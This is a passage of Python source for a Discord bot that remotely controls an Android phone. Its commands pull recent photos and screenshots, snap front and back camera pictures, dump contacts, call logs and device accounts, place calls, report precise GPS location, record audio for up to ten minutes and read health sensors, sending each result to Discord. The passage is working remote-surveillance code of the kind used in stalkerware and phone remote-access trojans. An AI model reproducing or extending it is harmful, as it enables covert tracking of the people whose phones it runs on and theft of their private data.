                      count: int = 5):
    folder = folder or _find_dir_in_roots(CAMERA_PATHS) \
             or os.path.join(ALLOWED_ROOT, "DCIM", "Camera")
    count = max(1, min(10, count))
    await interaction.response.defer()
    try:
        if not is_path_allowed(folder) or not os.path.isdir(folder):
            await _safe_reply(interaction, "❌ مجلد غير صالح.")
            return
        files = [os.path.join(folder, f)
                 for f in os.listdir(folder)
                 if f.lower().endswith((".jpg", ".jpeg", ".png",
                                        ".webp", ".gif", ".heic"))]
        files.sort(key=os.path.getmtime, reverse=True)
        files = files[:count]
        if not files:
            await _safe_reply(interaction, "لا توجد صور.")
            return
        for fp in files:
            compressed = await _compress_image(fp)
            try:
                size = os.path.getsize(compressed)
                await interaction.followup.send(
                    file=discord.File(compressed))
                STATS.record_file(size)
                await asyncio.sleep(0.5)
            except Exception as e:
                await interaction.followup.send(f"تعذر: {e}")
            finally:
                if compressed != fp and os.path.exists(compressed):
                    try:
                        os.remove(compressed)
                    except Exception:
                        pass
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")


@bot_command("pull_camera", "📤 اسحب آخر n صورة")
@app_commands.describe(n="العدد (1-20)")
@require_allowed
@with_stats("pull_camera")
async def pull_camera_cmd(interaction: discord.Interaction, n: int = 5):
    await interaction.response.defer()
    path = _find_dir_in_roots(CAMERA_PATHS)
    if not path:
        await _safe_reply(interaction, "❌ لم أجد مجلد الكاميرا.")
        return
    await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))


@bot_command("pull_screens", "📤 اسحب آخر n لقطة")
@app_commands.describe(n="العدد (1-20)")
@require_allowed
@with_stats("pull_screens")
async def pull_screens_cmd(interaction: discord.Interaction, n: int = 5):
    await interaction.response.defer()
    path = _find_dir_in_roots(SCREENSHOT_PATHS)
    if not path:
        await _safe_reply(interaction, "❌ لم أجد مجلد اللقطات.")
        return
    await _send_images_bulk(interaction, path, limit=max(1, min(20, n)))


@bot_command("resume", "▶️ استئناف السحب")
@require_allowed
@with_stats("resume")
async def resume_cmd(interaction: discord.Interaction):
    d = bulk_state.get('resume_dir')
    i = bulk_state.get('resume_index', 0)
    if not d:
        await _safe_reply(interaction, "لا يوجد سحب موقوف.", ephemeral=True)
        return
    await interaction.response.defer()
    bulk_state['suspended'] = False
    await _send_images_bulk(interaction, d, start_index=i)


@bot_command("stop_bulk", "⏹️ أوقف السحب الجماعي")
@require_allowed
@with_stats("stop_bulk")
async def stop_bulk_cmd(interaction: discord.Interaction):
    bulk_state['suspended'] = True
    await _safe_reply(interaction, "⛔ سيتم الإيقاف قريبًا.",
                      ephemeral=True)


# ═══════════════════════════════════════════════════════════════════
#                       Media Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("screenshot", "📸 لقطة شاشة")
@app_commands.describe(send="أرسلها لديسكورد؟")
@require_allowed
@require_bridge
@with_stats("screenshot")
async def screenshot_cmd(interaction: discord.Interaction,
                          send: bool = True):
    await interaction.response.defer()
    try:
        path = await asyncio.to_thread(_bridge.capture_screen)
    except Exception as e:
        STATS.record_error("screenshot")
        await _safe_reply(interaction, f"❌ {e}")
        return
    if not path or not os.path.isfile(path):
        await _safe_reply(
            interaction,
            "❌ فشل التقاط الشاشة.\n"
            "**ملاحظة:** في Android 11+، التقاط الشاشة الحقيقي "
            "يحتاج MediaProjection."
        )
        return
    size_mb = os.path.getsize(path) / (1024 * 1024)
    if size_mb > DISCORD_LIMIT_MB:
        await _safe_reply(interaction, f"⚠️ {size_mb:.1f}MB > الحد")
        return
    if send:
        try:
            await interaction.followup.send(
                embed=_make_embed(
                    "📸 لقطة شاشة",
                    f"`{os.path.basename(path)}`",
                    Colors.MEDIA,
                ),
                file=discord.File(path)
            )
            STATS.record_file(os.path.getsize(path))
        except Exception as e:
            await _safe_reply(interaction, f"خطأ: {e}")
    else:
        await _safe_reply(interaction, f"📸 حُفظت في `{path}`")


@bot_command("snap_back", "📷 صورة بالكاميرا الخلفية")
@require_allowed
@require_bridge
@with_cloud_audit("snap_back")
@with_stats("snap_back")
async def snap_back_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    path = await asyncio.to_thread(_bridge.capture_camera, 0)
    if not path or not os.path.isfile(path):
        await _safe_reply(
            interaction,
            "❌ فشل التصوير.\nتأكد من منح صلاحية الكاميرا."
        )
        return
    try:
        await interaction.followup.send(
            embed=_make_embed(
                "📷 كاميرا خلفية",
                f"`{os.path.basename(path)}`",
                Colors.MEDIA,
            ),
            file=discord.File(path)
        )
        STATS.record_file(os.path.getsize(path))
    except Exception as e:
        await _safe_reply(interaction, f"خطأ: {e}\n`{path}`")


@bot_command("snap_front", "🤳 صورة بالكاميرا الأمامية")
@require_allowed
@require_bridge
@with_cloud_audit("snap_front")
@with_stats("snap_front")
async def snap_front_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    path = await asyncio.to_thread(_bridge.capture_camera, 1)
    if not path or not os.path.isfile(path):
        await _safe_reply(
            interaction,
            "❌ فشل التصوير.\nتأكد من منح صلاحية الكاميرا."
        )
        return
    try:
        await interaction.followup.send(
            embed=_make_embed(
                "🤳 كاميرا أمامية",
                f"`{os.path.basename(path)}`",
                Colors.MEDIA,
            ),
            file=discord.File(path)
        )
        STATS.record_file(os.path.getsize(path))
    except Exception as e:
        await _safe_reply(interaction, f"خطأ: {e}\n`{path}`")


@bot_command("camera_app", "📷 افتح تطبيق الكاميرا")
@require_allowed
@require_bridge
@with_stats("camera_app")
async def camera_app_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    result = await asyncio.to_thread(_bridge.open_camera_app)
    await _safe_reply(interaction, result)


# ═══════════════════════════════════════════════════════════════════
#                       Contacts Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("contacts", "👥 جهات الاتصال")
@app_commands.describe(search="بحث")
@require_allowed
@require_bridge
@with_stats("contacts")
async def contacts_cmd(interaction: discord.Interaction, search: str = None):
    await interaction.response.defer()
    data = await asyncio.to_thread(_bridge.get_contacts, search or "")
    try:
        arr = json.loads(data) if data else []
    except Exception:
        arr = []
    if not arr:
        await _safe_reply(interaction, "👥 لا توجد جهات اتصال.")
        return

    lines = []
    for c in arr[:30]:
        lines.append(
            f"• **{c.get('name', '?')}** — `{c.get('number', '?')}`")
    if len(arr) > 30:
        lines.append(f"\n... و {len(arr)-30} أخرى")

    embed = _make_embed(
        f"👥 {len(arr)} جهة اتصال",
        "\n".join(lines)[:1900],
        Colors.CONTACTS,
    )
    await interaction.followup.send(embed=embed)


@bot_command("wa_home", "💬 واتساب الرئيسية")
@require_allowed
@require_bridge
@with_stats("wa_home")
async def wa_home_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    result = await asyncio.to_thread(_bridge.open_whatsapp_home)
    await _safe_reply(interaction, result)


@bot_command("wa", "💬 فتح محادثة واتساب")
@app_commands.describe(phone="الرقم", text="نص جاهز")
@require_allowed
@require_bridge
@with_stats("wa")
async def wa_cmd(interaction: discord.Interaction, phone: str = None,
                  text: str = None):
    await interaction.response.defer()
    result = await asyncio.to_thread(
        _bridge.open_whatsapp_chat, phone or "", text or "")
    await _safe_reply(interaction, result)


@bot_command("dial", "📞 لوحة الاتصال")
@app_commands.describe(phone="الرقم")
@require_allowed
@require_bridge
@with_stats("dial")
async def dial_cmd(interaction: discord.Interaction, phone: str):
    await interaction.response.defer()
    result = await asyncio.to_thread(_bridge.dial, phone)
    await _safe_reply(interaction, result)


# ═══════════════════════════════════════════════════════════════════
#                       Phone Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("calllog", "📞 سجل المكالمات")
@app_commands.describe(
    limit="العدد (1-100)",
    type_filter="all | incoming | outgoing | missed",
    search="بحث برقم أو اسم"
)
@require_allowed
@require_bridge
@with_stats("calllog")
async def calllog_cmd(interaction: discord.Interaction,
                       limit: int = 20,
                       type_filter: str = "all",
                       search: str = None):
    limit = max(1, min(100, limit))
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(
            _bridge.get_call_log, limit, type_filter or "all", search or ""
        )
        entries = json.loads(data) if data else []
    except Exception as e:
        STATS.record_error("calllog")
        await _safe_reply(interaction, f"❌ {e}")
        return

    if isinstance(entries, dict) and entries.get("status") == "permission_denied":
        await _safe_reply(
            interaction,
            "❌ **صلاحية سجل المكالمات غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **سجل المكالمات**"
        )
        return

    if not entries:
        await _safe_reply(interaction, "📞 لا توجد مكالمات مطابقة.")
        return

    type_icons = {
        "incoming": "📥", "outgoing": "📤", "missed": "❌",
        "rejected": "🚫", "blocked": "⛔", "voicemail": "📧",
    }

    lines = []
    for c in entries[:25]:
        icon = type_icons.get(c.get("type", "unknown"), "📱")
        name = c.get("name", "غير معروف")
        number = c.get("number", "?")
        duration = c.get("duration_str", "0s")
        is_new = "🆕 " if c.get("is_new") else ""
        lines.append(f"{is_new}{icon} **{name}** · `{number}` · {duration}")

    text = "\n".join(lines)
    if len(text) > 1900:
        tmp = tempfile.NamedTemporaryFile(
            delete=False, suffix='.txt', mode='w', encoding='utf-8')
        tmp.write(text)
        tmp.close()
        try:
            await interaction.followup.send(
                file=discord.File(tmp.name, filename="calllog.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        embed = _make_embed(
            f"📞 {len(entries)} مكالمة",
            text,
            Colors.PHONE,
        )
        await interaction.followup.send(embed=embed)


@bot_command("call", "☎️ إجراء مكالمة مباشرة")
@app_commands.describe(phone="رقم الهاتف")
@require_allowed
@require_bridge
@with_stats("call")
async def call_cmd(interaction: discord.Interaction, phone: str):
    await interaction.response.defer()

    if not _bridge.has_call_permission():
        await _safe_reply(
            interaction,
            "❌ **صلاحية إجراء المكالمات غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الهاتف**"
        )
        return

    result = await asyncio.to_thread(_bridge.call_number, phone)
    await _safe_reply(interaction, result)


@bot_command("phoneinfo", "📱 معلومات الهاتف والشبكة")
@require_allowed
@require_bridge
@with_stats("phoneinfo")
async def phoneinfo_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.get_phone_info)
        info = json.loads(data) if data else {}
    except Exception as e:
        STATS.record_error("phoneinfo")
        await _safe_reply(interaction, f"❌ {e}")
        return

    if info.get("status") == "permission_denied":
        await _safe_reply(
            interaction,
            "❌ **صلاحية معلومات الهاتف غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الهاتف**"
        )
        return

    embed = _make_embed("📱 معلومات الهاتف", color=Colors.PHONE)
    if info.get("network_operator"):
        embed.add_field(
            name="📡 الشبكة",
            value=(f"• المشغل: `{info['network_operator']}`\n"
                   f"• الكود: `{info.get('network_operator_code', '?')}`\n"
                   f"• النوع: `{info.get('network_type', '?')}`\n"
                   f"• البلد: `{info.get('network_country', '?')}`"),
            inline=True,
        )
    if info.get("sim_operator"):
        embed.add_field(
            name="💳 SIM",
            value=(f"• المشغل: `{info['sim_operator']}`\n"
                   f"• الكود: `{info.get('sim_operator_code', '?')}`\n"
                   f"• الحالة: `{info.get('sim_state', '?')}`\n"
                   f"• البلد: `{info.get('sim_country', '?')}`"),
            inline=True,
        )
    if info.get("phone_number"):
        embed.add_field(
            name="📞 رقم الهاتف",
            value=f"`{info['phone_number']}`",
            inline=False,
        )
    if "is_roaming" in info:
        embed.add_field(
            name="✈️ التجوال",
            value="✅ نعم" if info["is_roaming"] else "❌ لا",
            inline=True,
        )
    await interaction.followup.send(embed=embed)


# ═══════════════════════════════════════════════════════════════════
#                       Location Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("gps", "📍 الموقع الجغرافي الدقيق")
@require_allowed
@require_bridge
@with_cloud_audit("gps")
@with_stats("gps")
async def gps_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.get_location)
        loc = json.loads(data) if data else {}
    except Exception as e:
        STATS.record_error("gps")
        await _safe_reply(interaction, f"❌ {e}")
        return

    if loc.get("status") == "permission_denied":
        await _safe_reply(
            interaction,
            "❌ **صلاحية الموقع غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الموقع**"
        )
        return

    if loc.get("status") == "no_location":
        await _safe_reply(
            interaction,
            "❌ **لا يوجد موقع معروف**\n"
            "فعّل GPS ثم افتح خرائط Google مرة واحدة."
        )
        return

    if not loc.get("latitude"):
        await _safe_reply(interaction, "❌ لم أتمكن من قراءة الموقع.")
        return

    lat = loc.get("latitude")
    lon = loc.get("longitude")
    acc = loc.get("accuracy_m", 0)
    alt = loc.get("altitude_m", 0)
    provider = loc.get("provider", "?")
    age = loc.get("age_seconds", 0)
    maps = loc.get("maps_url", "")

    age_str = ""
    if age > 0:
        if age < 60:
            age_str = f"منذ {age} ثانية"
        elif age < 3600:
            age_str = f"منذ {age // 60} دقيقة"
        else:
            age_str = f"منذ {age // 3600} ساعة"
        if loc.get("is_stale"):
            age_str += " ⚠️ قديم"

    embed = _make_embed("📍 الموقع الحالي", color=Colors.LOCATION)
    embed.add_field(
        name="🌐 الإحداثيات",
        value=f"`{lat}`\n`{lon}`",
        inline=True,
    )
    embed.add_field(
        name="🎯 الدقة",
        value=f"`{acc:.1f}m`",
        inline=True,
    )
    embed.add_field(
        name="📡 المصدر",
        value=f"`{provider}`",
        inline=True,
    )
    if age_str:
        embed.add_field(name="⏰ العمر", value=age_str, inline=True)
    if alt:
        embed.add_field(name="⛰️ الارتفاع",
                        value=f"`{alt:.1f}m`", inline=True)
    embed.add_field(
        name="🗺️ الخريطة",
        value=f"[افتح في خرائط Google]({maps})",
        inline=False,
    )
    await interaction.followup.send(embed=embed)


@bot_command("gps_providers", "📡 حالة مزوّدي الموقع")
@require_allowed
@require_bridge
@with_stats("gps_providers")
async def gps_providers_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.get_location_providers)
        providers = json.loads(data) if data else {}
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if not providers:
        await _safe_reply(interaction, "❌ لم أتمكن من قراءة المزوّدين.")
        return

    def m(b):
        return "✅" if b else "❌"

    embed = _make_embed("📡 مزوّدو الموقع", color=Colors.LOCATION)
    embed.add_field(
        name="الحالة",
        value=(f"{m(providers.get('gps'))} 🛰️ GPS\n"
               f"{m(providers.get('network'))} 🌐 Network\n"
               f"{m(providers.get('passive'))} 📶 Passive"),
        inline=True,
    )
    if "location_enabled" in providers:
        embed.add_field(
            name="🔓 خدمة الموقع",
            value=m(providers['location_enabled']),
            inline=True,
        )
    if providers.get("all_providers"):
        embed.add_field(
            name="المتوفرة",
            value=", ".join(f"`{p}`" for p in providers["all_providers"]),
            inline=False,
        )
    await interaction.followup.send(embed=embed)


@bot_command("ip", "🌐 عنوان IP العام")
@require_allowed
@with_stats("ip")
async def ip_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        import requests
        r = requests.get("https://api.ipify.org?format=json", timeout=10)
        embed = _make_embed("🌐 IP العام",
                            f"`{r.json().get('ip')}`", Colors.INFO)
        await interaction.followup.send(embed=embed)
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")


# ═══════════════════════════════════════════════════════════════════
#                       Audio Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("record", "🎤 بدء تسجيل صوتي")
@app_commands.describe(duration="المدة بالثواني (1-600)")
@require_allowed
@require_bridge
@with_cloud_audit("record")
@with_stats("record")
async def record_cmd(interaction: discord.Interaction, duration: int = 10):
    duration = max(1, min(600, duration))
    await interaction.response.defer()

    if _bridge.is_audio_recording():
        await _safe_reply(
            interaction,
            "⚠️ يوجد تسجيل جارٍ بالفعل.\n"
            "استخدم `/record_stop` لإيقافه."
        )
        return

    result = await asyncio.to_thread(
        _bridge.start_audio_recording, duration)
    await _safe_reply(interaction, result)


@bot_command("record_stop", "⏹️ إيقاف التسجيل وإرساله")
@require_allowed
@require_bridge
@with_stats("record_stop")
async def record_stop_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    if not _bridge.is_audio_recording():
        await _safe_reply(interaction, "⚠️ لا يوجد تسجيل جارٍ.")
        return

    path = await asyncio.to_thread(_bridge.stop_audio_recording)
    if not path or not os.path.isfile(path):
        await _safe_reply(interaction, "❌ لم يتم العثور على ملف التسجيل.")
        return

    size_mb = os.path.getsize(path) / (1024 * 1024)
    if size_mb > DISCORD_LIMIT_MB:
        await _safe_reply(
            interaction,
            f"⚠️ الحجم {size_mb:.1f}MB > الحد\n`{path}`"
        )
        return

    try:
        await interaction.followup.send(
            embed=_make_embed(
                "🎤 تسجيل صوتي",
                f"`{os.path.basename(path)}`",
                Colors.AUDIO,
            ),
            file=discord.File(path)
        )
        STATS.record_file(os.path.getsize(path))
    except Exception as e:
        await _safe_reply(interaction, f"خطأ: {e}\n`{path}`")


@bot_command("record_status", "📊 حالة التسجيل الحالي")
@require_allowed
@require_bridge
@with_stats("record_status")
async def record_status_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    is_rec = _bridge.is_audio_recording()
    if not is_rec:
        await _safe_reply(interaction, "⏹️ لا يوجد تسجيل جارٍ.")
        return

    dur = _bridge.get_recording_duration()
    state = _bridge.get_audio_state() if hasattr(_bridge, "get_audio_state") \
            else "RECORDING"
    fmt = _bridge.get_audio_format() if hasattr(_bridge, "get_audio_format") \
          else "?"

    embed = _make_embed(
        "🎤 التسجيل الجاري",
        f"📊 الحالة: `{state}`\n"
        f"⏱️ المدة: `{dur}s`\n"
        f"🎵 الصيغة: `{fmt}`\n\n"
        f"استخدم `/record_stop` للإيقاف.",
        Colors.AUDIO,
    )
    await interaction.followup.send(embed=embed)


@bot_command("record_pause", "⏸️ إيقاف مؤقت للتسجيل")
@require_allowed
@require_bridge
@require_android_min(24)
@with_stats("record_pause")
async def record_pause_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        if hasattr(_bridge, "pause_audio_recording"):
            result = await asyncio.to_thread(_bridge.pause_audio_recording)
        else:
            result = "❌ pause_audio_recording غير متوفرة في bridge"
    except Exception as e:
        result = f"❌ {e}"
    await _safe_reply(interaction, result)


@bot_command("record_resume", "▶️ استئناف التسجيل")
@require_allowed
@require_bridge
@require_android_min(24)
@with_stats("record_resume")
async def record_resume_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        if hasattr(_bridge, "resume_audio_recording"):
            result = await asyncio.to_thread(_bridge.resume_audio_recording)
        else:
            result = "❌ resume_audio_recording غير متوفرة في bridge"
    except Exception as e:
        result = f"❌ {e}"
    await _safe_reply(interaction, result)


@bot_command("record_history", "📜 آخر 10 تسجيلات")
@require_allowed
@require_bridge
@with_stats("record_history")
async def record_history_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        if hasattr(_bridge, "get_recording_history"):
            data = await asyncio.to_thread(_bridge.get_recording_history)
            history = json.loads(data) if data else []
        else:
            history = []
    except Exception:
        history = []

    if not history:
        await _safe_reply(interaction, "📜 لا يوجد سجل تسجيلات.")
        return

    lines = []
    for i, p in enumerate(history, 1):
        name = os.path.basename(p)
        size = ""
        try:
            if os.path.isfile(p):
                size = _fmt_size(os.path.getsize(p))
        except Exception:
            pass
        lines.append(f"`{i}.` `{name}`" + (f" — {size}" if size else ""))

    embed = _make_embed(
        f"📜 آخر {len(history)} تسجيل",
        "\n".join(lines)[:1900],
        Colors.AUDIO,
    )
    await interaction.followup.send(embed=embed)


@bot_command("record_stats", "📊 إحصائيات التسجيلات")
@require_allowed
@require_bridge
@with_stats("record_stats")
async def record_stats_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        total = _bridge.get_total_recordings() \
                if hasattr(_bridge, "get_total_recordings") else 0
        dur = _bridge.get_total_record_duration() \
              if hasattr(_bridge, "get_total_record_duration") else 0
        is_rec = _bridge.is_audio_recording()
        cur_dur = _bridge.get_recording_duration() if is_rec else 0
    except Exception:
        total = 0
        dur = 0
        is_rec = False
        cur_dur = 0

    def fmt_dur(s):
        if s < 60: return f"{s}s"
        if s < 3600: return f"{s//60}m {s%60}s"
        return f"{s//3600}h {(s%3600)//60}m"

    embed = _make_embed(
        "📊 إحصائيات التسجيلات",
        f"🎤 **إجمالي التسجيلات:** `{total}`\n"
        f"⏱️ **إجمالي المدة:** `{fmt_dur(dur)}`\n"
        f"🔴 **جارٍ الآن:** "
        f"{'✅ نعم — ' + str(cur_dur) + 's' if is_rec else '❌ لا'}",
        Colors.AUDIO,
    )
    await interaction.followup.send(embed=embed)


@bot_command("record_cleanup", "🗑️ حذف التسجيلات القديمة")
@app_commands.describe(keep="عدد التسجيلات الأخيرة للإبقاء")
@require_allowed
@require_bridge
@with_stats("record_cleanup")
async def record_cleanup_cmd(interaction: discord.Interaction,
                              keep: int = 5):
    keep = max(1, min(50, keep))
    await interaction.response.defer()
    try:
        if hasattr(_bridge, "cleanup_recordings"):
            deleted = await asyncio.to_thread(_bridge.cleanup_recordings, keep)
        else:
            deleted = 0
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    embed = _make_embed(
        "🗑️ تم التنظيف",
        f"• محذوف: `{deleted}` ملف\n"
        f"• محفوظ: `{keep}` ملف",
        Colors.SUCCESS,
    )
    await interaction.followup.send(embed=embed)


@bot_command("record_amplitude", "🔊 مستوى الصوت اللحظي")
@require_allowed
@require_bridge
@with_stats("record_amplitude")
async def record_amplitude_cmd(interaction: discord.Interaction):
    await interaction.response.defer()
    try:
        if hasattr(_bridge, "get_audio_amplitude"):
            amp = _bridge.get_audio_amplitude()
        else:
            amp = 0
    except Exception:
        amp = 0

    if amp <= 0:
        await _safe_reply(interaction,
                          "🔇 مستوى الصوت: `0` (لا يوجد تسجيل جارٍ)")
        return

    bars = min(20, max(1, amp // 1000))
    bar_str = "█" * bars + "░" * (20 - bars)

    embed = _make_embed(
        "🔊 مستوى الصوت",
        f"`[{bar_str}]` {amp}\n"
        f"📊 القيمة: `{amp}/32767`",
        Colors.AUDIO,
    )
    await interaction.followup.send(embed=embed)


# ═══════════════════════════════════════════════════════════════════
#                       Accounts Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("accounts", "🔑 الحسابات على الجهاز")
@app_commands.describe(
    filter_type="فلترة بالنوع",
    category="الفئة",
    search="بحث بالاسم",
    sort_by="الترتيب (name/type/category)"
)
@require_allowed
@require_bridge
@with_stats("accounts")
async def accounts_cmd(interaction: discord.Interaction,
                        filter_type: str = None,
                        category: str = None,
                        search: str = None,
                        sort_by: str = "name"):
    await interaction.response.defer()

    try:
        if hasattr(_bridge, "get_accounts_advanced"):
            data = await asyncio.to_thread(
                _bridge.get_accounts_advanced,
                filter_type or "", category or "",
                search or "", sort_by or "name"
            )
        else:
            data = await asyncio.to_thread(
                _bridge.get_accounts, filter_type or "")
        accounts = json.loads(data) if data else []
    except Exception as e:
        STATS.record_error("accounts")
        await _safe_reply(interaction, f"❌ {e}")
        return

    if isinstance(accounts, dict) and accounts.get("status") == "permission_denied":
        await _safe_reply(
            interaction,
            "❌ **صلاحية الوصول للحسابات غير ممنوحة**\n\n"
            "افتح التطبيق → الأذونات → فعّل **الحسابات**"
        )
        return

    if not accounts:
        await _safe_reply(interaction, "🔑 لا توجد حسابات مطابقة.")
        return

    grouped = defaultdict(list)
    for acc in accounts:
        grouped[acc.get("type_short", "Other")].append(acc.get("name", "?"))

    embed = _make_embed(
        f"🔑 {len(accounts)} حساب",
        color=Colors.ACCOUNTS,
    )
    for type_name, names in sorted(grouped.items()):
        value = "\n".join(f"• `{n}`" for n in names[:8])
        if len(names) > 8:
            value += f"\n... و {len(names)-8} أخرى"
        embed.add_field(
            name=f"**{type_name}** ({len(names)})",
            value=value[:1024],
            inline=False,
        )
    await interaction.followup.send(embed=embed)


@bot_command("accounts_stats", "📊 إحصائيات الحسابات")
@require_allowed
@require_bridge
@with_stats("accounts_stats")
async def accounts_stats_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        if hasattr(_bridge, "get_accounts_stats"):
            data = await asyncio.to_thread(_bridge.get_accounts_stats)
            stats = json.loads(data) if data else {}
        else:
            stats = {}
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if not stats:
        await _safe_reply(interaction, "📊 لا توجد إحصائيات.")
        return

    if stats.get("status") == "permission_denied":
        await _safe_reply(interaction,
                          "❌ **صلاحية الوصول للحسابات غير ممنوحة**")
        return

    total = stats.get("total", 0)
    by_cat = stats.get("by_category", {})

    cat_icons = {
        "email": "📧", "messaging": "💬", "social": "👥",
        "cloud": "☁️", "financial": "💳", "gaming": "🎮",
        "system": "⚙️", "other": "🔑",
    }

    embed = _make_embed(
        "📊 إحصائيات الحسابات",
        f"🔑 **الإجمالي:** `{total}`",
        Colors.ACCOUNTS,
    )
    if by_cat:
        lines = []
        for cat, count in sorted(by_cat.items(), key=lambda x: -x[1]):
            icon = cat_icons.get(cat, "🔑")
            lines.append(f"{icon} **{cat}**: `{count}`")
        embed.add_field(
            name="حسب الفئة",
            value="\n".join(lines)[:1024],
            inline=False,
        )
    await interaction.followup.send(embed=embed)


@bot_command("accounts_grouped", "📁 الحسابات مجمّعة")
@require_allowed
@require_bridge
@with_stats("accounts_grouped")
async def accounts_grouped_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        if hasattr(_bridge, "get_grouped_accounts"):
            data = await asyncio.to_thread(_bridge.get_grouped_accounts)
            grouped = json.loads(data) if data else {}
        else:
            grouped = {}
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if not grouped:
        await _safe_reply(interaction, "📁 لا توجد حسابات مجمّعة.")
        return

    if grouped.get("status") == "permission_denied":
        await _safe_reply(interaction,
                          "❌ **صلاحية الوصول للحسابات غير ممنوحة**")
        return

    cat_icons = {
        "email": "📧", "messaging": "💬", "social": "👥",
        "cloud": "☁️", "financial": "💳", "gaming": "🎮",
        "system": "⚙️", "other": "🔑",
    }

    embed = _make_embed("📁 الحسابات مجمّعة", color=Colors.ACCOUNTS)
    for cat, accs in sorted(grouped.items()):
        if not isinstance(accs, list) or not accs:
            continue
        icon = cat_icons.get(cat, "🔑")
        value = "\n".join(
            f"• `{a.get('name', '?') if isinstance(a, dict) else str(a)}`"
            for a in accs[:8]
        )
        if len(accs) > 8:
            value += f"\n... و {len(accs)-8} أخرى"
        embed.add_field(
            name=f"{icon} **{cat.upper()}** ({len(accs)})",
            value=value[:1024],
            inline=False,
        )
    await interaction.followup.send(embed=embed)


# ═══════════════════════════════════════════════════════════════════
#                       Sensors Commands
# ═══════════════════════════════════════════════════════════════════
@bot_command("sensors", "❤️ قائمة كل المستشعرات")
@require_allowed
@require_bridge
@with_stats("sensors")
async def sensors_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.list_sensors)
        sensors = json.loads(data) if data else []
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if not sensors:
        await _safe_reply(interaction, "❌ لا توجد مستشعرات.")
        return

    lines = []
    for s in sensors[:30]:
        lines.append(
            f"• **{s.get('type_name', '?')}** — "
            f"`{s.get('name', '?')}`"
        )
    if len(sensors) > 30:
        lines.append(f"\n... و {len(sensors)-30} أخرى")

    text = "\n".join(lines)
    if len(text) > 1900:
        tmp = tempfile.NamedTemporaryFile(
            delete=False, suffix='.txt', mode='w', encoding='utf-8')
        tmp.write(text)
        tmp.close()
        try:
            await interaction.followup.send(
                file=discord.File(tmp.name, filename="sensors.txt"))
        finally:
            try:
                os.remove(tmp.name)
            except Exception:
                pass
    else:
        embed = _make_embed(
            f"❤️ {len(sensors)} مستشعر",
            text,
            Colors.SENSORS,
        )
        await interaction.followup.send(embed=embed)


@bot_command("heartbeat", "❤️ قراءة نبضات القلب")
@require_allowed
@require_bridge
@with_cloud_audit("heartbeat")
@with_stats("heartbeat")
async def heartbeat_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.read_heart_rate)
        result = json.loads(data) if data else {}
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await _safe_reply(interaction,
                          "❌ **الجهاز لا يحتوي على مستشعر نبضات القلب.**")
        return
    if result.get("status") == "timeout":
        await _safe_reply(interaction,
                          "⏰ لم تحصل قراءة. المس المستشعر بإصبعك.")
        return
    if result.get("status") == "permission_denied":
        await _safe_reply(
            interaction,
            "❌ **صلاحية مستشعرات الجسم غير ممنوحة**"
        )
        return

    value = result.get("value")
    if value is None:
        await _safe_reply(interaction, "❌ لم أتمكن من قراءة النبض.")
        return

    embed = _make_embed(
        "❤️ نبضات القلب",
        f"💓 **{value:.0f} BPM**\n"
        f"📊 عدد القراءات: `{result.get('samples', 1)}`\n"
        f"📡 المستشعر: `{result.get('sensor', '?')}`",
        Colors.SENSORS,
    )
    await interaction.followup.send(embed=embed)


@bot_command("steps", "🏃 عدد الخطوات")
@require_allowed
@require_bridge
@with_stats("steps")
async def steps_cmd(interaction: discord.Interaction):
    await interaction.response.defer()

    try:
        data = await asyncio.to_thread(_bridge.read_step_counter)
        result = json.loads(data) if data else {}
    except Exception as e:
        await _safe_reply(interaction, f"❌ {e}")
        return

    if result.get("status") == "no_sensor":
        await _safe_reply(interaction,
                          "❌ **الجهاز لا يحتوي على مستشعر عدّ الخطوات.**")
        return
    if result.get("status") == "timeout":
        await _safe_reply(interaction, "⏰ لم تحصل قراءة.")
        return

    value = result.get("value")
    if value is None:
        await _safe_reply(interaction, "❌ لم أتمكن من القراءة.")
        return

    embed = _make_embed(
        "🏃 عدد الخطوات",
        f"👣 **{int(value)}** خطوة\n"
        f"📡 المستشعر: `{result.get('sensor', '?')}`",
        Colors.SENSORS,
    )
